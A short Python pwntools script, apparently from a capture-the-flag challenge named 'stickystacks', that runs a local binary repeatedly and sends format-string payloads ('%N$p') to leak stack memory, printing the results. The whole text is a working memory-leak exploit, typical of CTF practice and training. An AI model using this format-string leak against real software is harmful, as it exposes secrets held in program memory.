from pwn import *

stacks = []

for i in range(100):
    io = process("./stickystacks")
    payload = '%' + str(i+1) + '$p'
    io.recvuntil(":")
    io.sendline(payload)
    io.recvuntil('Welcome, ')
    stacks.append(io.recv())

for s in stacks:
    print(s)